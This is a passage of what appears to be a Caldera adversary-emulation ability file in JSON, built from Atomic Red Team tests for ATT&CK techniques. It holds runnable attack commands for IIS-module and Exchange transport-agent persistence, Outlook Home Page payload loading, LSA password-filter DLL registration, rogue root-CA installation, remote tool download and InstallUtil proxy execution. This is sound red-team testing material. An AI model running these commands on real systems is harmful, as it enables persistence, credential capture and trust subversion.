[IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using AppCmd.exe.\n[Managing and installing Modules Reference](https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview#to-install-a-module-using-appcmdexe)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["%windir%\\system32\\inetsrv\\appcmd.exe uninstall module DefaultDocumentModule_Atomic"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "%windir%\\system32\\inetsrv\\appcmd.exe install module /name:DefaultDocumentModule_Atomic /image:%windir%\\system32\\inetsrv\\defdoc.dll", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "IIS Components", "ability_id": "231b7dd1e4747af98c35602340a1b6bf", "technique_id": "T1505.004", "tactic": "persistence", "requirements": [], "name": "Install IIS Module using AppCmd.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic will utilize PowerShell Cmdlet New-WebGlobalModule to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using New-WebGlobalModule.\n[Managing IIS Modules with PowerShell](https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-WebGlobalModule -Name DefaultDocumentModule_Atomic"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image %windir%\\system32\\inetsrv\\defdoc.dll", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "IIS Components", "ability_id": "e8c24e75714483eb3b526fc589a88f9a", "technique_id": "T1505.004", "tactic": "persistence", "requirements": [], "name": "Install IIS Module using PowerShell Cmdlet New-WebGlobalModule", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["if(Get-Command \"Get-TransportAgent\" -ErrorAction Ignore){;   Disable-TransportAgent Security Interop Agent;   Uninstall-TransportAgent Security Interop Agent;   Get-TransportAgent; }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll; Enable-TransportAgent Security Interop Agent; Get-TransportAgent | Format-List Name,Enabled", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Server Software Component: Transport Agent", "ability_id": "b00d08275bb2b3ef620e103b1fd7b9e4", "technique_id": "T1505.002", "tactic": "persistence", "requirements": [], "name": "Install MS Exchange Transport Agent Persistence", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.\n\nTriggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["d43bfc_T1137.004.html"], "parsers": [], "cleanup": ["reg.exe delete HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\WebView\\Inbox /v URL /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg.exe add HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\WebView\\Inbox /v URL /t REG_SZ /d file://d43bfc_T1137.004.html /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Office Application Startup: Outlook Home Page", "ability_id": "ca603e77fa1ab9a2cd7a471b88311a3c", "technique_id": "T1137.004", "tactic": "persistence", "requirements": [], "name": "Install Outlook Home Page Persistence", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Download and install PSTools by unzipping the file", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "eb814e03-811a-467a-bc6d-dcd453750fa2", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Install PSTools", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Download, install and start new process under PowerShell Core 6", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm PowerShellCore.msi;"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group}\" -WindowStyle hidden;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "60f63260-39bb-4136-87a0-b6c2dca799fc", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Install PowerShell Core 6", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["reg.exe import PathToAtomicsFolder\\T1556.002\\lsa_backup.reg; remove-item C:\\Windows\\System32\\AtomicRedTeamPWFilter.dll"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ PathToAtomicsFolder\\T1556.002\\lsa_backup.reg; $passwordFilterName = (Copy-Item \"PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename; $lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"; $notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\"); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Modify Authentication Process: Password Filter DLL", "ability_id": "efc885d494a744745a149ad2802e7403", "technique_id": "T1556.002", "tactic": "multiple", "requirements": [], "name": "Install and Register Password Filter DLL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a root CA with openssl\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /etc/pki/ca-trust/source/anchors/rootCA.crt; update-ca-trust"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "openssl genrsa -out rootCA.key 4096; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt; cp rootCA.crt /etc/pki/ca-trust/source/anchors/; update-ca-trust", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Subvert Trust Controls: Install Root Certificate", "ability_id": "ddc68247897068b0e9afb5e1ecd254d1", "technique_id": "T1553.004", "tactic": "defense-evasion", "requirements": [], "name": "Install root CA on CentOS/RHEL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a root CA with openssl\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -f rootCA.crt ]; then : ; else if [ ! -f rootCA.key ]; then openssl genrsa -out rootCA.key 4096; fi; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt; fi;  ;  mv rootCA.crt /usr/local/share/ca-certificates; echo sudo update-ca-certificates", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Subvert Trust Controls: Install Root Certificate", "ability_id": "ba8d59e23b49ff619ec0b9e81b967a16", "technique_id": "T1553.004", "tactic": "defense-evasion", "requirements": [], "name": "Install root CA on Debian/Ubuntu", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a root CA with Powershell\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["try {;    $cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore;    Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore;    Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; }; catch { }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My; Move-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Subvert Trust Controls: Install Root Certificate", "ability_id": "51ddafefb92c9dfcb6ce3369e7316bf3", "technique_id": "T1553.004", "tactic": "defense-evasion", "requirements": [], "name": "Install root CA on Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a root CA with certutil\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["try {; $cert = Import-Certificate -FilePath $env:Temp\\rootCA2.cer -CertStoreLocation Cert:\\LocalMachine\\My; Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; } catch { }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "certutil -addstore my $env:Temp\\rootCA2.cer", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Subvert Trust Controls: Install Root Certificate", "ability_id": "2cdcf1010a524231a26b5f3c6025eb91", "technique_id": "T1553.004", "tactic": "defense-evasion", "requirements": [], "name": "Install root CA on Windows with certutil", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a root CA with openssl\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -f rootCA.crt ]; then : ; else if [ ! -f rootCA.key ]; then openssl genrsa -out rootCA.key 4096; fi; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt; fi;  ;  sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"rootCA.crt\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Subvert Trust Controls: Install Root Certificate", "ability_id": "347554800d9fecf541670235a8ec31d9", "technique_id": "T1553.004", "tactic": "defense-evasion", "requirements": [], "name": "Install root CA on macOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'InstallHelper';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: InstallUtil", "ability_id": "c129aca94d1d22aad238ee07f5db7813", "technique_id": "T1218.004", "tactic": "defense-evasion", "requirements": [], "name": "InstallHelper method call", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_HelpText_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: InstallUtil", "ability_id": "8546aa1934a705574c7591af340e0251", "technique_id": "T1218.004", "tactic": "defense-evasion", "requirements": [], "name": "InstallUtil HelpText method call", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Install_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: InstallUtil", "ability_id": "e0edd5aef59c72e31fb14e12a26a5066", "technique_id": "T1218.004", "tactic": "defense-evasion", "requirements": [], "name": "InstallUtil Install method call", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: InstallUtil", "ability_id": "f30d3e0b387703e1a2eafd31b9103434", "technique_id": "T1218.004", "tactic": "defense-evasion", "requirements": [], "name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: InstallUtil", "ability_id": "ebd726fe1e5462434f28d632424f86e5", "technique_id": "T1218.004", "tactic": "defense-evasion", "requirements": [], "name": "InstallUtil Uninstall method call - /U variant", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: InstallUtil", "ability_id": "492807a41cd2991f59acf9d615e46682", "technique_id": "T1218.004", "tactic": "defense-evasion", "requirements": [], "name": "InstallUtil class constructor method call", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.txt\" -ErrorAction Ignore; Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallLog\" -ErrorAction Ignore; Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallState\" -ErrorAction Ignore; Remove-Item -Path \"$Env:windir\\System32\\Tasks\\notepad.exe\" -ErrorAction Ignore"], 